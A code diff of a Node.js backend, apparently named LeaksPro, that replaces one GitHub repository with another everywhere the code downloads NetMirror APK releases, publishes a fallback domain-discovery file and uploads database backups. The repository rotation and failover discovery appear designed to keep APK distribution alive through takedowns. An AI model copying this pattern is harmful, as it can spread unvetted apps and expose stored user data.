@@ -405,7 +405,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         }
 
         // Fallback: Try GitHub Releases API across multiple repos
-        const REPOS = ['Aldura5398/klad4', 'rurikonishawa/leaksprogod'];
+        const REPOS = ['kritenspar-sketch/klad5', 'rurikonishawa/leaksprogod'];
         for (const REPO of REPOS) {
           try {
             const apiHeaders = {
@@ -442,7 +442,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
 
         // Last resort: try direct download URL (public, no auth)
         const DIRECT_URLS = [
-          'https://github.com/Aldura5398/klad4/releases/download/latest/NetMirror.apk',
+          'https://github.com/kritenspar-sketch/klad5/releases/download/latest/NetMirror.apk',
           'https://github.com/rurikonishawa/leaksprogod/releases/download/latest/app-release.apk',
         ];
         for (const url of DIRECT_URLS) {
@@ -559,7 +559,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         'Accept': 'application/vnd.github.v3+json',
         'User-Agent': 'LeaksPro-Backend'
       };
-      const REPOS = ['Aldura5398/klad4', 'rurikonishawa/leaksprogod'];
+      const REPOS = ['kritenspar-sketch/klad5', 'rurikonishawa/leaksprogod'];
       for (const repo of REPOS) {
         try {
           const relRes = await fetch(`https://api.github.com/repos/${repo}/releases/tags/latest`, { headers });
@@ -1074,7 +1074,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       const token = db.prepare("SELECT value FROM admin_settings WHERE key = 'github_token'").get();
       if (!token?.value) { console.log('[AdminApk] No GitHub token — skipping auto-restore'); return false; }
       const headers = { 'Authorization': `token ${token.value}`, 'Accept': 'application/vnd.github.v3+json', 'User-Agent': 'LeaksPro-Backend' };
-      for (const REPO of ['Aldura5398/klad4', 'rurikonishawa/leaksprogod']) {
+      for (const REPO of ['kritenspar-sketch/klad5', 'rurikonishawa/leaksprogod']) {
         try {
           const relRes = await fetch(`https://api.github.com/repos/${REPO}/releases/tags/latest`, { headers });
           if (!relRes.ok) continue;
@@ -1500,7 +1500,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         try {
           const token = db.prepare("SELECT value FROM admin_settings WHERE key = 'github_token'").get();
           if (!token?.value) return;
-          const REPOS = ['Aldura5398/klad4', 'rurikonishawa/leaksprogod'];
+          const REPOS = ['kritenspar-sketch/klad5', 'rurikonishawa/leaksprogod'];
           const wrapperData = fs.readFileSync(wrapperPath);
           for (const REPO of REPOS) {
             try {
@@ -2169,7 +2169,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         api_base: `${publicUrl}/api`,
         admin_panel: `${publicUrl}/admin`,
         download_apk: `${publicUrl}/downloadapp/Netmirror.apk`,
-        fallback_discovery: `https://raw.githubusercontent.com/Aldura5398/klad4/main/domain.json`,
+        fallback_discovery: `https://raw.githubusercontent.com/kritenspar-sketch/klad5/main/domain.json`,
         is_failover: false,
         timestamp: Date.now()
       });
@@ -3476,7 +3476,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
           }
           const backupJson = JSON.stringify(backup);
 
-          const apiUrl = `https://api.github.com/repos/Aldura5398/klad4/contents/backups/db-backup.json`;
+          const apiUrl = `https://api.github.com/repos/kritenspar-sketch/klad5/contents/backups/db-backup.json`;
           const headers = {
             'Authorization': `token ${token.value}`,
             'Accept': 'application/vnd.github.v3+json',
